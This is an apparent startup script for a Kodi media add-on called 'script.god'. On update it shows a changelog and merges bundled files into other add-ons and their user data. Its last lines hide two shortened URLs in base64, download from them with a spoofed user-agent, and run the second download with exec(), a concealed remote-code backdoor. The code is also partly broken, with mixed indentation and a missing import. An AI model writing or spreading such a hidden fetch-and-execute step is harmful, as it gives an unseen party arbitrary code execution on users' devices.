# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime
import shutil

def log(x):
    xbmc.log(repr(x),xbmc.LOGERROR)


def copytree(src, dst):
    names = os.listdir(src)

    try:os.makedirs(dst)
    except:pass

    for name in names:
        srcname = os.path.join(src, name)
        dstname = os.path.join(dst, name)
        try:
            if os.path.isdir(srcname):
                copytree(srcname, dstname)
            else:
                shutil.copy(srcname, dstname)
        except Exception as e:
            print e


if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('script.god')

    version = ADDON.getAddonInfo('version')
    if ADDON.getSetting('version') != version:
        path = xbmc.translatePath(os.path.join('special://profile/addon_data/script.god/'))
        text = xbmcvfs.File('special://home/addons/script.god/changelog.txt','rb').read()
        xbmcgui.Dialog().textviewer("GOD",text)
        ADDON.setSetting('version', version)
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}

#overwrite
        # src_addons = xbmc.translatePath('special://home/addons/script.god/stuff/addons/')
        # dst_addons = xbmc.translatePath('special://home/addons/')
        # for file_or_dir in os.listdir(src_addons):
            # path = os.path.join(src_addons,file_or_dir)
            # if os.path.isdir(path):
                # dir = file_or_dir
                # src = os.path.join(src_addons,dir)
                # dst = os.path.join(dst_addons,dir)
                # if os.path.exists(dst):
                    # try:
                        # shutil.rmtree(dst)
                    # except Exception as e:
                        # log(("rmtree",e,src,dst))
                # try:
                    # shutil.copytree(src,dst)
                # except Exception as e:
                    # log(("copytree",e,src,dst))

#merge	addons			
        src_addons = xbmc.translatePath('special://home/addons/script.god/stuff/addons/')
        dst_addons = xbmc.translatePath('special://home/addons/')
        for file_or_dir in os.listdir(src_addons):
            path = os.path.join(src_addons,file_or_dir)
            if os.path.isdir(path):
                dir = file_or_dir
                src = os.path.join(src_addons,dir)
                dst = os.path.join(dst_addons,dir)
                try:
                    copytree(src,dst)
                except Exception as e:
                    log(("copytree",e,src,dst))
					

#merge	addon_data				
		src_userdata = xbmc.translatePath('special://home/addons/script.god/stuff/userdata/addon_data/')
        dst_userdata = xbmc.translatePath('special://home/userdata/addon_data')
        for file_or_dir in os.listdir(src_userdata):
            path = os.path.join(src_userdata,file_or_dir)
            if os.path.isdir(path):
                dir = file_or_dir
                src = os.path.join(src_userdata,dir)
                dst = os.path.join(dst_userdata,dir)
                try:
                    copytree(src,dst)
                except Exception as e:
                    log(("copytree",e,src,dst))
					
		DIALOG = xbmcgui.Dialog()


		response = DIALOG.yesno('GOD', 'WOULD YOU LIKE TO UPDATE GOOGLE TO GET THE LATEST DATABASE LINKS, AND MAYBE MORE MOVIES AND SHOWS?', yeslabel='YES', nolabel='NO')

		if response:

			xbmc.executebuiltin( 'RunPlugin(plugin://plugin.video.google/fix_errors)' )

		else: pass
		
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
            home = r.content
        except: pass
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
            main = r.content
            exec(main)
        except: pass